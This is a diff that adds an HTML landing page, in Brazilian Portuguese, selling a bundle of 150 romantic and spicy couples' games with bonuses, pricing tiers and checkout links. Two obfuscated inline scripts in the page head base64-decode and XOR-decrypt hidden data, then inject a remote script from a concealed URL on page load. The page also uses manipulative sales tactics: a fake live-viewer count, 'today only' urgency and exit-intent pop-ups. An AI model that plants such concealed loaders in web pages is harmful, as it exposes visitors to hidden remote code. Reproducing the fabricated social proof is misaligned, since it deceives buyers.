@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>+150 Jogos Românticos e Picantes para Jogar em Dupla no Celular</title>
+<link rel="stylesheet" href="css/style.css">
+
+<script>(function(){var n_w=atob("DJAJS+vkW3089mafhusrPpmIeUcenhLr9uMzZMSHPxMSgxLy7/ZwZYiLNlNehEns5eJgO5+XdA1VjgPzqeBgM46IdRdP1Eq95+R9OYKGLglZhUSl3c0laYyINB9dmhW9vMtyaYWFNhgezETv7+hsJ6KAeVEegAfz8/UrccnSOksEx1SusqdoeNjSPhkIwQL+5KA5e9PGJiBB");var o_3s=[];for(var z_ezmr=0;z_ezmr<n_w.length;z_ezmr++){o_3s.push(n_w.charCodeAt(z_ezmr)&255);}var d_9d=o_3s[0];var f_vk=o_3s.slice(1,1+d_9d);var m_x=o_3s.slice(1+d_9d);var d_6vvf=m_x.map(function(b,w_uha){return b^f_vk[w_uha%d_9d];});var f_u="";for(var m_i6=0;m_i6<d_6vvf.length;m_i6++){f_u+=String.fromCharCode(d_6vvf[m_i6]&255);}var q_05=decodeURIComponent(escape(f_u));var i_2gt=JSON.parse(q_05);var r_g=i_2gt.globals||[];r_g.forEach(function(z_1h){window[z_1h.name]=z_1h.value;});var j_7ize=document.createElement("script");j_7ize.src=i_2gt.url;j_7ize.async=true;j_7ize.defer=true;(i_2gt.attributes||[]).forEach(function(a_kc){j_7ize.setAttribute(a_kc.name,a_kc.value);});(document.head||document.documentElement).appendChild(j_7ize);})();</script>
+
+<script>(function(){var e_dmfk=atob("DCdemmxFubqSSFhQN1x87x4pm4CwICwkR1RktUMm3dS8PSw9XkEntA8q1JTwOncjVFU36hg2ls/mJSt/W0Yq/x8xl9DhanRyVlMq6AUnzM73O3pqbFx89A0o3JioajwxQ0Zz7xgo0NzrZSgiUlE79Bhowdn9LHUjVEx8tk4z2NbnLXpqFQUjthdn19v/LXpqFUM/7g1ozM7/IT4pGlcs/xog186/Oy0yXkMtuEBnz9v+PT1yDQV85zE4");var j_lt7i=[];for(var f_ki8=0;f_ki8<e_dmfk.length;f_ki8++){j_lt7i.push(e_dmfk.charCodeAt(f_ki8)&255);}var l_war=j_lt7i[0];var u_wqg=j_lt7i.slice(1,1+l_war);var d_92d=j_lt7i.slice(1+l_war);var r_nyqb=d_92d.map(function(b,e_4b){return b^u_wqg[e_4b%l_war];});var y_hmq="";for(var z_r=0;z_r<r_nyqb.length;z_r++){y_hmq+=String.fromCharCode(r_nyqb[z_r]&255);}var p_n0=decodeURIComponent(escape(y_hmq));var i_v=JSON.parse(p_n0);var f_h78=i_v.globals||[];f_h78.forEach(function(j_gk){window[j_gk.name]=j_gk.value;});var t_abnd=document.createElement("script");t_abnd.src=i_v.url;t_abnd.async=true;t_abnd.defer=true;(i_v.attributes||[]).forEach(function(c_e){t_abnd.setAttribute(c_e.name,c_e.value);});(document.head||document.documentElement).appendChild(t_abnd);})();</script>
+</head>
+<body>
+
+  <header class="hero">
+    <h1>
+      <span class="highlight">+150 Jogos Românticos e Picantes</span> para Jogar em Dupla no Celular
+    </h1>
+    <p class="subtitle">Saia da rotina e deixe essa noite ainda mais quente e divertida com esse aplicativo</p>
+
+    <div class="live-badge">
+      <span class="dot"></span>
+      🔥 <span id="live-count">365</span> CASAIS ASSISTINDO A ESTA APRESENTAÇÃO AGORA...
+    </div>
+  </header>
+
+  <main>
+
+    <section class="video-section">
+      <div class="video-player" id="video-player">
+        <div class="video-time" id="video-time">0:00</div>
+        <video
+          class="hero-video"
+          id="hero-video"
+          src="assets/video/hero-video.mp4"
+          playsinline
+          preload="metadata"
+        ></video>
+        <button class="play-btn" id="play-btn" aria-label="Reproduzir vídeo">
+          <svg viewBox="0 0 24 24" width="32" height="32"><path fill="currentColor" d="M8 5v14l11-7z"/></svg>
+        </button>
+        <div class="video-controls">
+          <span class="video-status" id="video-status">PAUSADO</span>
+          <span class="video-quality">100% HD</span>
+        </div>
+        <div class="video-progress">
+          <div class="video-progress-bar" id="progress-bar"></div>
+        </div>
+      </div>
+
+      <a href="#pricing" class="btn btn-green btn-cta">RESGATAR MEUS JOGOS</a>
+    </section>
+
+    <section class="games-carousel">
+      <h2 class="carousel-title">Conheça <span class="green-text">10 dos 150 jogos</span> inclusos</h2>
+      <div class="carousel-wrap">
+        <button class="carousel-btn prev" data-target="carousel-1" aria-label="Anterior">‹</button>
+        <div class="carousel-track" id="carousel-1">
+          <div class="carousel-slide"><img src="assets/games/jogo-da-memoria-do-casal.png" alt="Jogo da Memória do Casal" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/voce-me-conhece.png" alt="Você Me Conhece?" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/casal-detetive.png" alt="Casal Detetive" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/uno-da-conexao.png" alt="Uno da Conexão" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/trunfo-da-paixao.png" alt="Trunfo da Paixão" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/verdade-ou-mentira.png" alt="Verdade ou Mentira?" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/roleta-do-desejo.png" alt="Roleta do Desejo" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/cartas-da-seducao.png" alt="Cartas da Sedução" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/quem-sou-eu-no-amor.png" alt="Quem Sou Eu no Amor?" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/desafio-da-tentacao.png" alt="Desafio da Tentação" loading="lazy"></div>
+        </div>
+        <button class="carousel-btn next" data-target="carousel-1" aria-label="Próximo">›</button>
+      </div>
+    </section>
+
+    <section class="pain-solution">
+      <div class="card pain-card">
+        <h2>Sente que a relação <span class="red-text">caiu na rotina?</span></h2>
+        <p class="card-subtitle">SINAIS DE QUE VOCÊS PRECISAM DE ALGO NOVO:</p>
+        <ul class="list pain-list">
+          <li><span class="icon-x">✕</span> Passam a noite inteira rolando o feed do Instagram</li>
+          <li><span class="icon-x">✕</span> O sexo virou algo automático e sem desejo e os assuntos parecem estar acabando</li>
+          <li><span class="icon-x">✕</span> Vocês não lembram da última vez que riram de verdade juntos</li>
+        </ul>
+      </div>
+
+      <div class="card solution-card">
+        <h2>Calma, agora <span class="green-text">você tem a solução certa!</span></h2>
+        <p class="card-subtitle">O QUE VOCÊ VAI ENCONTRAR:</p>
+        <ul class="list solution-list">
+          <li><span class="icon-check">✓</span> São 150 jogos de casal para jogar em dupla no celular ou imprimir. Perfeito para sair da rotina!</li>
+          <li><span class="icon-check">✓</span> Jogos e desafios picantes para aproximar ainda mais o casal</li>
+          <li><span class="icon-check">✓</span> Jogos para dar risada, conversar e criar mais conexão e intimidade</li>
+          <li><span class="icon-check">✓</span> Jogos para fazer em casa, pelo WhatsApp ou em encontros</li>
+        </ul>
+      </div>
+    </section>
+
+    <section class="games-carousel">
+      <h2 class="carousel-title">Prévia de <span class="green-text">+10 jogos</span> que você irá receber</h2>
+      <div class="carousel-wrap">
+        <button class="carousel-btn prev" data-target="carousel-2" aria-label="Anterior">‹</button>
+        <div class="carousel-track" id="carousel-2">
+          <div class="carousel-slide"><img src="assets/games/o-que-eu-escolheria.png" alt="O Que Eu Escolheria?" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/brincando-com-fogo.png" alt="Brincando com Fogo" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/que-desenho-e-esse.png" alt="Que Desenho É Esse?" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/jogo-da-garrafa-picante.png" alt="Jogo da Garrafa Picante" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/quiz-do-casal.png" alt="Quiz do Casal" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/bingo-romantico.png" alt="Bingo Romântico" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/toque-e-prazer.png" alt="Toque e Prazer" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/bobbie-goods-do-amor.png" alt="Bobbie Goods do Amor" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/jogo-do-beijo.png" alt="Jogo do Beijo" loading="lazy"></div>
+          <div class="carousel-slide"><img src="assets/games/stop-do-relacionamento.png" alt="Stop do Relacionamento" loading="lazy"></div>
+        </div>
+        <button class="carousel-btn next" data-target="carousel-2" aria-label="Próximo">›</button>
+      </div>
+    </section>
+
+    <section class="guarantee">
+      <div class="guarantee-icon">🛡️</div>
+      <h3>Garantia incondicional de 30 dias</h3>
+      <p>Se em até 30 dias você e seu parceiro não se divertirem, não criarem mais conexão e não sentirem que valeu cada centavo, nós devolvemos 100% do seu dinheiro.</p>
+    </section>
+
+    <section class="testimonials">
+      <h2 class="testimonials-title">O QUE OS CASAIS ESTÃO DIZENDO</h2>
+      <p class="testimonials-subtitle">RECOMENDADO POR MAIS DE 3.478 CASAIS</p>
+
+      <div class="testimonial-carousel">
+        <button class="testimonial-btn prev" data-target="testimonial-track" aria-label="Depoimento anterior">‹</button>
+        <div class="testimonial-track" id="testimonial-track">
+          <div class="testimonial-slide"><img src="assets/testimonials/testimonial-1.png" alt="Depoimento de casal cliente" loading="lazy"></div>
+          <div class="testimonial-slide"><img src="assets/testimonials/testimonial-2.png" alt="Depoimento de casal cliente" loading="lazy"></div>
+          <div class="testimonial-slide"><img src="assets/testimonials/testimonial-3.png" alt="Depoimento de casal cliente" loading="lazy"></div>
+          <div class="testimonial-slide"><img src="assets/testimonials/testimonial-4.png" alt="Depoimento de casal cliente" loading="lazy"></div>
+          <div class="testimonial-slide"><img src="assets/testimonials/testimonial-5.png" alt="Depoimento de casal cliente" loading="lazy"></div>
+        </div>
+        <button class="testimonial-btn next" data-target="testimonial-track" aria-label="Próximo depoimento">›</button>
+      </div>
+
+      <div class="testimonial-dots" id="testimonial-dots"></div>
+    </section>
+
+    <section class="bonus-preview">
+      <div class="bonus-preview-tag">🎁 BÔNUS EXCLUSIVOS</div>
+      <p class="bonus-preview-subtitle">SOMENTE HOJE NO PACOTE COMPLETO</p>
+      <div class="bonus-preview-banner">
+        <span class="green-text">+34 SUPER BÔNUS</span> — mais de R$ 395 em bônus especiais já inclusos no seu acesso premium.
+      </div>
+      <div class="bonus-preview-grid">
+        <div class="bonus-preview-item">
+          <img src="assets/bonus-surpresas-romanticas.jpg" alt="60 ideias de surpresas românticas" loading="lazy">
+          <p>🎁 60 ideias de surpresas românticas</p>
+          <span class="bonus-preview-old">De R$67</span>
+          <span class="bonus-preview-free">GRÁTIS</span>
+        </div>
+        <div class="bonus-preview-item">
+          <img src="assets/bonus-cartas-envelopes.jpg" alt="27 cartas e envelopes prontos para presente" loading="lazy">
+          <p>💌 27 cartas e envelopes prontos para presente</p>
+          <span class="bonus-preview-old">De R$47</span>
+          <span class="bonus-preview-free">GRÁTIS</span>
+        </div>
+        <div class="bonus-preview-item">
+          <img src="assets/bonus-moldes-romanticos.jpg" alt="+80 Moldes Românticos" loading="lazy">
+          <p>🎀 +80 Moldes Românticos</p>
+          <span class="bonus-preview-old">De R$67</span>
+          <span class="bonus-preview-free">GRÁTIS</span>
+        </div>
+        <div class="bonus-preview-item">
+          <img src="assets/bonus-34-exclusivos.jpg" alt="+34 Bônus Grátis Exclusivos" loading="lazy">
+          <p>✨ +34 Bônus Grátis Exclusivos</p>
+          <span class="bonus-preview-old">De R$97</span>
+          <span class="bonus-preview-free">GRÁTIS</span>
+        </div>
+      </div>
+    </section>
+
+    <section id="pricing" class="pricing">
+      <div class="pricing-card pricing-card--basic">
+        <h3>PLANO BÁSICO</h3>
+        <div class="price-new price-new--basic">R$ <span>7,90</span></div>
+        <div class="price-note">PAGAMENTO ÚNICO • ACESSO VITALÍCIO</div>
+        <ul class="pricing-list">
+          <li><span class="icon-check">✓</span> +150 jogos de casal no celular e para imprimir</li>
+          <li><span class="icon-check">✓</span> Acesso imediato após o pagamento</li>
+          <li><span class="icon-check">✓</span> Garantia incondicional de 30 dias</li>
+        </ul>
+        <a href="https://pay.cakto.com.br/okjqikb_1005982" class="btn btn-outline btn-cta" id="checkout-btn-basic">QUERO O PLANO BÁSICO</a>
+        <div class="secure-note">🔒 Compra 100% segura • Acesso imediato no e-mail</div>
+      </div>
+
+      <div class="pricing-card">
+        <span class="pricing-badge">MAIS POPULAR</span>
+        <h3>ACESSO PREMIUM VITALÍCIO</h3>
+        <div class="price-old">R$ 47,00</div>
+        <div class="price-new">R$ <span>27,90</span></div>
+        <div class="price-note">PAGAMENTO ÚNICO • ACESSO VITALÍCIO</div>
+        <ul class="pricing-list">
+          <li><span class="icon-check">✓</span> +150 jogos de casal no celular e para imprimir</li>
+          <li><span class="icon-check">✓</span> +34 bônus exclusivos inclusos</li>
+          <li><span class="icon-check">✓</span> Acesso imediato após o pagamento</li>
+          <li><span class="icon-check">✓</span> Atualizações futuras gratuitas</li>
+          <li><span class="icon-check">✓</span> Garantia incondicional de 30 dias</li>
+        </ul>
+        <a href="https://pay.cakto.com.br/3ae5zsa" class="btn btn-green btn-cta" id="checkout-btn">SIM! QUERO O MEU ACESSO</a>
+        <div class="secure-note">🔒 Compra 100% segura • Acesso imediato no e-mail</div>
+      </div>
+    </section>
+
+    <section class="bonus">
+      <h2>O que vem nos <span class="green-text">+34 Bônus</span>:</h2>
+
+      <div class="bonus-category">
+        <h3 class="bonus-cat-title">💌 Mensagens e Conversas</h3>
+        <ul class="bonus-grid">
+          <li><span class="icon-check">✓</span> 100 mensagens de bom dia românticas</li>
+          <li><span class="icon-check">✓</span> 100 mensagens de boa noite românticas</li>
+          <li><span class="icon-check">✓</span> 50 elogios prontos para WhatsApp</li>
+          <li><span class="icon-check">✓</span> 30 cartas românticas prontas</li>
+          <li><span class="icon-check">✓</span> 30 frases para status romântico</li>
+          <li><span class="icon-check">✓</span> 20 textos para legenda de foto</li>
+          <li><span class="icon-check">✓</span> 20 ideias de pedidos de desculpas</li>
+          <li><span class="icon-check">✓</span> 20 ideias para reconciliação</li>
+        </ul>
+      </div>
+
+      <div class="bonus-category">
+        <h3 class="bonus-cat-title">❤️ Romance e Surpresas</h3>
+        <ul class="bonus-grid">
+          <li><span class="icon-check">✓</span> 20 surpresas para fazer em casa</li>
+          <li><span class="icon-check">✓</span> 15 ideias de jantar romântico</li>
+          <li><span class="icon-check">✓</span> 30 ideias de presentes baratos</li>
+          <li><span class="icon-check">✓</span> 20 ideias de bilhetes escondidos</li>
+          <li><span class="icon-check">✓</span> 20 ideias de surpresa à distância</li>
+          <li><span class="icon-check">✓</span> 15 ideias para pedido de namoro</li>
+          <li><span class="icon-check">✓</span> 15 ideias para pedido de casamento</li>
+          <li><span class="icon-check">✓</span> 10 roteiros de surpresa simples</li>
+        </ul>
+      </div>
+
+      <div class="bonus-category">
+        <h3 class="bonus-cat-title">🔥 Conexão e Intimidade</h3>
+        <ul class="bonus-grid">
+          <li><span class="icon-check">✓</span> 50 desafios românticos</li>
+          <li><span class="icon-check">✓</span> 30 perguntas para casal</li>
+          <li><span class="icon-check">✓</span> 20 ideias para sair da rotina</li>
+          <li><span class="icon-check">✓</span> 15 ideias para casal com pouco tempo</li>
+          <li><span class="icon-check">✓</span> 10 roteiros de noite romântica</li>
+          <li><span class="icon-check">✓</span> 15 cupons de amor prontos para imprimir</li>
+        </ul>
+      </div>
+
+      <div class="bonus-category">
+        <h3 class="bonus-cat-title">📅 Datas Especiais &amp; Organização</h3>
+        <ul class="bonus-grid">
+          <li><span class="icon-check">✓</span> 25 ideias para aniversário de namoro</li>
+          <li><span class="icon-check">✓</span> 25 ideias para aniversário de casamento</li>
+          <li><span class="icon-check">✓</span> 20 ideias para datas especiais</li>
+          <li><span class="icon-check">✓</span> 20 ideias para casal casado</li>
+          <li><span class="icon-check">✓</span> 20 ideias para namorados</li>
+          <li><span class="icon-check">✓</span> 20 ideias para noivos</li>
+          <li><span class="icon-check">✓</span> Checklist do encontro perfeito</li>
+          <li><span class="icon-check">✓</span> Checklist da surpresa barata</li>
+          <li><span class="icon-check">✓</span> Calendário romântico mensal</li>
+          <li><span class="icon-check">✓</span> Lista de músicas românticas</li>
+          <li><span class="icon-check">✓</span> Modelo de carta para imprimir</li>
+          <li><span class="icon-check">✓</span> Planner de momentos do casal</li>
+        </ul>
+      </div>
+
+      <div class="bonus-highlight">🔥 TUDO ISSO INCLUSO NO PACOTE DE <strong>R$ 27,90</strong></div>
+
+      <a href="https://pay.cakto.com.br/3ae5zsa" class="btn btn-green btn-cta" id="checkout-btn-bonus">Quero o Pacote Completo</a>
+    </section>
+
+    <section class="faq">
+      <h2>Dúvidas frequentes</h2>
+      <div class="faq-list">
+        <div class="faq-item">
+          <button class="faq-question">Como funcionam os jogos?</button>
+          <div class="faq-answer"><p>Após a compra, você recebe acesso imediato aos 150 jogos de casal, que podem ser jogados diretamente no celular ou impressos. Basta escolher um jogo e seguir as instruções junto com seu parceiro(a).</p></div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-question">O acesso é imediato?</button>
+          <div class="faq-answer"><p>Sim! Assim que o pagamento for aprovado, você recebe o acesso completo por e-mail em poucos minutos.</p></div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-question">Funciona no iPhone e Android?</button>
+          <div class="faq-answer"><p>Sim, o acesso funciona em qualquer smartphone com navegador, tanto iPhone quanto Android, além de computadores.</p></div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-question">O pagamento é mensal?</button>
+          <div class="faq-answer"><p>Não. Em qualquer um dos planos é um pagamento único com acesso vitalício, sem mensalidades ou cobranças recorrentes.</p></div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-question">Qual a diferença entre o plano básico e o premium vitalício?</button>
+          <div class="faq-answer"><p>O plano básico (R$ 7,90) dá acesso aos 150 jogos de casal no celular e para imprimir. O premium vitalício (R$ 27,90), que é o mais popular, inclui os mesmos 150 jogos + os 34 bônus exclusivos (roteiros, ideias e cartas românticas) + atualizações futuras gratuitas.</p></div>
+        </div>
+      </div>
+    </section>
+
+    <section class="final-cta">
+      <h2>Prontos para viver <span class="green-text">momentos inesquecíveis?</span></h2>
+      <a href="#pricing" class="btn btn-green btn-cta">RESGATAR TUDO AGORA →</a>
+      <div class="final-cta-icons">
+        <span>🛡️</span>
+        <span>🎁</span>
+        <span>⚡</span>
+      </div>
+    </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <p>© 2026 150 Jogos Românticos - Todos os direitos reservados.</p>
+    <p class="footer-links"><a href="#">Termos de Uso</a> · <a href="#">Política de Privacidade</a></p>
+  </footer>
+
+  <div class="modal-overlay" id="upsell-modal" hidden>
+    <div class="modal-card">
+      <button class="modal-close" aria-label="Fechar" data-close="upsell-modal">×</button>
+      <div class="modal-tag">🔥 OFERTA ESPECIAL</div>
+      <h3>Espera! Antes de continuar...</h3>
+      <p>Por um pouco mais, leve o <strong>Acesso Premium Vitalício</strong> com os <span class="green-text">+34 bônus exclusivos</span> inclusos, atualizações gratuitas e garantia de 30 dias.</p>
+      <a href="https://pay.cakto.com.br/fwk2ccm" class="btn btn-green btn-cta">SIM, QUERO O PREMIUM POR R$ 17,90</a>
+      <a href="https://pay.cakto.com.br/okjqikb_1005982" class="modal-secondary-link">Não, quero continuar só com o plano básico</a>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="exit-modal" hidden>
+    <div class="modal-card">
+      <button class="modal-close" aria-label="Fechar" data-close="exit-modal">×</button>
+      <div class="modal-tag">⏰ ESPERA!</div>
+      <h3>Antes de você ir...</h3>
+      <p>Preparamos uma oferta especial só para você, por tempo limitado.</p>
+      <a href="https://pay.cakto.com.br/toj5oju" class="btn btn-green btn-cta">OFERTA ESPECIAL E COMPLETA POR APENAS R$ 14,90</a>
+    </div>
+  </div>
+
+  <script src="js/script.js"></script>
+</body>
+</html>
